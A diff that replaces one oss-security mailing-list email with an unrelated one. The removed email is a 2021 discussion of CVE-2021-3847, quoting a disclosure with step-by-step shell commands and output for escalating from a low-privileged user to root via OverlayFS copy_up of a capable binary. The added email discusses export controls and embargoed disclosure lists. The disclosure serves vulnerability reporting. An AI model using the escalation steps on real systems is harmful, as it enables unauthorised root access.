@@ -1,9 +1,4 @@
-X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["6336" "Tuesday" "19" "October" "2021" "13:35:04" "-0300" "Thadeu Lima de Souza Cascardo" "cascardo@canonical.com" nil "133" "Re: [oss-security] CVE-2021-3847: OverlayFS - Potential Privilege Escalation using overlays copy_up" nil nil nil "10" nil nil (number mark "U       cascardo@can Oct 19  133/6336  " thread-indent "\"Re: [oss-security] CVE-2021-3847: OverlayFS - Potential Privilege Escalation using overlays copy_up\"\n") nil nil nil nil nil nil nil nil nil "Re: [oss-security] CVE-2021-3847: OverlayFS - Potential Privilege Escalation using overlays copy_up" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	nil)
-X-Mozilla-Status: 0000
-X-Mozilla-Status2: 00000000
-Received: (qmail 24354 invoked by uid 550); 19 Oct 2021 16:46:19 -0000
+Received: (qmail 9647 invoked by uid 550); 17 May 2022 12:52:48 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -12,169 +7,80 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 19554 invoked from network); 19 Oct 2021 16:35:22 -0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=canonical.com;
-	s=20210705; t=1634661310;
-	bh=1/lvLIQGuFwzjT7eBx45Cfasvc9iD6/rvhVRK8x9HKI=;
-	h=Date:From:To:Cc:Subject:Message-ID:References:MIME-Version:
-	 Content-Type:In-Reply-To;
-	b=SGLGvI2F1+Q1Y8VRHdIhV2VDCHqquN1azpbD17W35DN9RTGKs65fDJWZRBWlYqHys
-	 1/yjcpWXjMs7GkvcZ7Cd+dsOd8WAqVPLjT36kyI/rYyxOwR0HzreSMVE2pGCWawP3N
-	 Pk+zCrLlamPMkLQncI/+LDkitvF1soYWKL19pn9xjpdP4l9wfbh4jlXmzMNSb5+uaM
-	 14BOMqxmDk+TyMoYTyc1KI6afPFAmcEYsivFwjYD5pLXqhyaXvSa6FttxQipTKmcBY
-	 w5qW6bBxiTBA4FOebEvWVuD5fvaVOdHZUhOJnaHgGl2/3MAClwpImHb5lxeemG9NOh
-	 keClqYutdDBtQ==
-Date: Tue, 19 Oct 2021 13:35:04 -0300
-From: Thadeu Lima de Souza Cascardo <cascardo@canonical.com>
-To: Miklos Szeredi <miklos@szeredi.hu>
-Cc: oss-security@lists.openwall.com, linux-fsdevel@vger.kernel.org,
-	linux-unionfs@vger.kernel.org,
-	Alon Zahavi <Alon.Zahavi@cyberark.com>,
-	Vegard Nossum <vegard.nossum@oracle.com>,
-	Nir Chako <Nir.Chako@cyberark.com>,
-	Alon Zahavi <zahavi.alon@gmail.com>
-Message-ID: <YW7zuLv8TYDNzyqC@mussarela>
-References: <DB9P193MB140461EEF44F153D9F66FF958DB89@DB9P193MB1404.EURP193.PROD.OUTLOOK.COM>
- <PAXP193MB1405A3EC41713BE9D524FBE48DB89@PAXP193MB1405.EURP193.PROD.OUTLOOK.COM>
- <YW7i72bOgRGmCs2O@miu.piliscsaba.redhat.com>
+Received: (qmail 9578 invoked from network); 17 May 2022 12:52:48 -0000
+Date: Tue, 17 May 2022 12:52:34 +0000
+From: Jeremy Stanley <fungi@yuggoth.org>
+To: oss-security@lists.openwall.com
+Message-ID: <20220517125233.q2xhgdov2l7bpuvb@yuggoth.org>
+References: <20220517033033.GA3403712@millbarge>
+ <YoOCmBqfouvgbEX0@zx2c4.com>
+ <YoOMdbwp3D8bynKy@kroah.com>
 MIME-Version: 1.0
-Content-Type: text/plain; charset=utf-8
+Content-Type: multipart/signed; micalg=pgp-sha512;
+	protocol="application/pgp-signature"; boundary="sxpsmda6nldrobil"
 Content-Disposition: inline
-Content-Transfer-Encoding: 8bit
-In-Reply-To: <YW7i72bOgRGmCs2O@miu.piliscsaba.redhat.com>
-Subject: Re: [oss-security] CVE-2021-3847: OverlayFS - Potential Privilege
- Escalation using overlays copy_up
+In-Reply-To: <YoOMdbwp3D8bynKy@kroah.com>
+User-Agent: NeoMutt/20170113 (1.7.2)
+X-SA-Exim-Connect-IP: 2001:4802:7801:102:be76:4eff:fe20:63e0
+X-SA-Exim-Rcpt-To: oss-security@lists.openwall.com
+X-SA-Exim-Mail-From: fungi@yuggoth.org
+X-SA-Exim-Scanned: No (on azathoth.yuggoth.org); SAEximRunCond expanded to false
+Subject: Re: [oss-security] linux-distros list policy and Linux kernel
 
-On Tue, Oct 19, 2021 at 05:23:27PM +0200, Miklos Szeredi wrote:
-> On Thu, Oct 14, 2021 at 06:30:53PM +0000, Alon Zahavi wrote:
-> > 
-> > After disclosing the issue with the linux-distros mailing list, I am reporting the security issue publicly to here.
-> > There is no patch available and may not be available for a long time because the kernel can’t enforce the mitigation proposed, as that would be a layering violation and could also possibly cause a regression.
-> > This vulnerability was attached with CVE-2021-3847.
-> > Here is the report that was initially sent:
-> > 
-> > ## Bug Class
-> > Escalation of privileges - Bypassing the security extended attribute attachment restrictions (in order to modify the security.capability xattr, a process will need CAP_SYS_ADMIN or CAP_SETFCAP).
-> > # Technical Details
-> > ## Summary:
-> > An attacker with a low-privileged user on a Linux machine with an overlay mount which has a file capability in one of its layers may escalate his privileges up to root when copying a capable file from a nosuid mount into another mount.
-> > ## In details:
-> > If there is an overlay mount that one of its lower layers contains a file with capabilities and in case that the lower layer is a nosuid mount (which means the file capabilities are being ignored at execution), an attacker with low-privileges user can touch the file, which causes the overlayFS driver to copy_up the file with its capabilities into the upper layer. That way the attacker can now execute the file with the file's capabilities, thus escalating its privileges.
-> 
-> I think this is a misunderstanding about how overlayfs operates.  Mounting
-> overlayfs is effectively a just-in-time version of "cp -a lowerdir upperdir".
-> In other words if the admin creates an overlay where the lower layer is
-> untrusted and the upper layer is trusted, then that act itself is the
-> privilege escalation.
-> 
-> This is more formally documented in "Documentation/filesystems/overlayfs.rst"
-> in the "Permission model" section.
-> 
-> If this model is not clear, then maybe it needs to be spelled out more
-> explicitly.  Perhaps even a warning message could be added to the kernel logs
-> in case the lower mount is "nosuid".  But IMO erroring out on the copy-up or
-> skipping copy up of certain attributes would make the cure worse than the
-> disease.
+--sxpsmda6nldrobil
+Content-Type: text/plain; charset=us-ascii
+Content-Disposition: inline
+Content-Transfer-Encoding: quoted-printable
 
-Should we fail (and log it) when the lower mount and upper mount have different
-suid settings, and require a force option to be used?
+Another potential nail in the coffin for embargoed disclosure lists
+such as linux-distros and distros, as well as the idea of embargoed
+disclosure in general, is recent changes in export controls, most
+recently by the USA's Commerce Dept. While there seem to be
+exceptions called out for "cybersecurity response" and
+"vulnerability disclosure" in 86-FR-58205 (Information Security
+Controls: Cybersecurity Items), I've been in a number of semi-hushed
+conversations with vulnerability managers of other large free/libre
+open source projects over worries that the provisions for this are
+still too vague.
 
-Cascardo.
+In particular, I've heard concerns raised by developers living in
+the USA that privately supplying vulnerability fix patches or
+information on exploiting privately identified vulnerabilities to
+individuals in "restricted" countries could be a contravention of
+federal export control policy, and that determining whether every
+individual in receipt of this information is not a resident of a
+"restricted" country is unfeasible enough to make a switch to
+full-disclosure models increasingly attractive for these projects.
 
-> 
-> Let me know if I'm missing something.
-> 
-> Thanks,
-> Miklos
-> 
-> > See attached image.
-> > ## Build:
-> > Any Linux machine with a support for overlayFS.
-> > For example: AWS EC2 Ubuntu 20.04.
-> > Mount a device to any folder.
-> > Copy any file with capabilities into that folder.
-> > Remount the device now with nosuid option.
-> > mount an overlayFS mount where there are two layers. Make sure the lower directory is the directory with the capable file.
-> > ## Execution:
-> > As a low-priv user cd into the merged directory.
-> > Execute touch capable_file
-> > cd to the upper layer directory.
-> > Execute the capable binary.
-> > ## Expected Results:
-> > When copying a capable file using a low privileges user, the file should be copied without any file capabilities. As the Linux kernel restricts the copying of a file with capabilities, so low-pric user should not be able to achieve this goal.
-> > ## Observed Results:
-> > The new file that appears in the upper layer directory have the same capabilities as the file that had been copied. This behavior occur probably because the overlay driver's process is the one responsible for the copying, and it copies the whole file with its extended attributes.
-> > 
-> > 
-> > ########## Example ##########
-> > # there are two mount in question
-> > $ cd /home/user/overlayfs/
-> > 
-> > $ ls -l
-> > drwxr-xr-x 3 user user   4096 Sep 19 14:07 lowerUSB
-> > drwxrwxr-x 1 user user   4096 Sep 19 14:06 merge
-> > drwxrwxr-x 2 user user   4096 Sep 14 13:32 test
-> > drwxrwxr-x 2 user user   4096 Sep 19 14:06 upper
-> > drwxrwxr-x 3 user user   4096 Sep 19 14:25 work
-> > 
-> > # there are two mount in question.
-> > # lowerUSB is a mount of an USB, which has a capable file inside.
-> > # IMPORTENT NOTE: This mount has "nosuid" option, so capabilities should be ignored while executing it.
-> > # The second mount is the overlay mount. Its lower directory is `lowerUSB/` which is the first mount mentioned above. Its upper is just a regular directory on the root fs.
-> > $ mount
-> > /dev/sdd on /home/user/overlayfs/lowerUSB type ext4 (rw,nosuid,nodev,relatime,uhelper=udisks2)
-> > overlay on /home/user/overlayfs/merge type overlay (rw,relatime,lowerdir=lowerUSB,upperdir=upper,workdir=work)
-> > 
-> > # The contents of all the directories.
-> > $ ls -l *
-> > lowerUSB:
-> > total 40
-> > -rwxr-xr-x 1 user user 17104 Sep 13 15:58 escalate
-> > drwx------ 2 user user 16384 Jul  5 14:07 lost+found
-> > 
-> > merge:
-> > total 40
-> > -rwxr-xr-x 1 user user 17104 Sep 19 14:27 escalate
-> > drwx------ 2 user user 16384 Jul  5 14:07 lost+found
-> > 
-> > test:
-> > total 0
-> > 
-> > upper:
-> > total 0
-> > 
-> > work:
-> > total 4
-> > d--------- 2 root root 4096 Sep 19 14:25 work
-> > 
-> > # escalate is an executable that set its uid and gid to 0.
-> > $ getcap ./lowerUSB/escalate
-> > ./lowerUSB/escalate = cap_setgid,cap_setuid+eip
-> > 
-> > $ id
-> > uid=1000(user) gid=1000(user) groups=1000(user)
-> > 
-> > # When trying to execute ./lowerUSB/escalate, it does not work because it is a `nosuid` mount.
-> > $ ./lowerUSB/escalate
-> > [-] Failure
-> > 
-> > # Try to copy the binary with its capabilities.
-> > # It should not work, because regular users are not allowed to copy the "security.capability" xattr.
-> > $ cp --preserve=all ./lowerUSB/escalate ./test/escalate
-> > cp: setting attribute 'security.capability' for 'security.capability': Operation not permitted
-> > 
-> > # Trigger the copy_up
-> > $ touch ./merge/escalate
-> > $ ls -l ./upper/
-> > -rwxr-xr-x 1 user user 17K Sep 19 15:01 escalate
-> > 
-> > # The copy_up kept the binary capabilities (xattr)
-> > $ getcap ./upper/escalate
-> > ./upper/escalate = cap_setgid,cap_setuid+eip
-> > 
-> > # executing the binary, with the capabilities, so the privileges will escalate to root.
-> > $ ./upper/escalate
-> > $ id
-> > uid=0(root) gid=0(root) groups=0(root)
-> > 
-> > 
+Unfortunately, the regulations are also new enough that getting a
+clear risk assessment on these matters from legal counsel available
+to community-run projects and non-profit foundations is...
+challenging. Further, I've had some vulnerability manager colleagues
+instructed by their employers to cease participation in any embargo
+processes for related "corporate liability" reasons.
+--=20
+Jeremy Stanley
+
+--sxpsmda6nldrobil
+Content-Type: application/pgp-signature; name="signature.asc"
+
+-----BEGIN PGP SIGNATURE-----
+
+iQKTBAABCgB9FiEEl65Jb8At7J/DU7LnSPmWEUNJWCkFAmKDmopfFIAAAAAALgAo
+aXNzdWVyLWZwckBub3RhdGlvbnMub3BlbnBncC5maWZ0aGhvcnNlbWFuLm5ldDk3
+QUU0OTZGQzAyREVDOUZDMzUzQjJFNzQ4Rjk5NjExNDM0OTU4MjkACgkQSPmWEUNJ
+WCmKyhAAq0T1qkEf6eBjCJ8GOXamUmkEIF6MR/40pI8Yd95+dX9PmU3KvRGvqG+b
+tS7XrcYcULq8Oy6snYrYU1EbclhnAuM6n/6/HPXMCvqEWSSpnQMHHeBVaxE9YRgJ
+rKP1N8PNH+XN5gvFvbD3QuDlxy8rg+F0Ii2877jkfHxNTYTPpDo2FDOoK1DcCjWU
+ueeVqLPFWRwxPitXX7oGmyRr2PyKGtMAZZ8ptiMnfdfc+qaFenAqsbl5xBe7VVBL
+J4latl6xq8fhddcPgashqx7qXVfXaQ/CaFQo6ceNnsWf3JedNWa2smcHpvDboQ49
+nqsoU6to+3KhDOdZFeZz1ukiaJOToFw22HgfwcB2/RGGllLuXNs+IXMxkPb3bF/H
+1ak+GJdcKNO7t7mWrNXyCwxxT9c91EDw3cxZFzW9tcPtfGMe6YT5Od5MA11A9uGu
+ltYbrivlYHZ6iMWdz83OP69EkazsLhcgI0szcaQrafleLkJh/qvWjkC0mkpq5V+P
+DIs3i2rNzq8WYPG3SEdBpU59GW+heVsXKgA6Dwk8mq2B1YrJGjfVLqhpQ9DzcSpz
+SMCJFIF0rP8gRvN5izeLzeKsQhOdkCCrjP/eP3gNGRIqDzJP/Q/HZrAcwaI7Vwan
+11bl67UnC/mbTJbKFiilVLnkAqKjlhLBfxdn4YUCjM7XHA/aZlw=
+=NjJC
+-----END PGP SIGNATURE-----
+
+--sxpsmda6nldrobil--
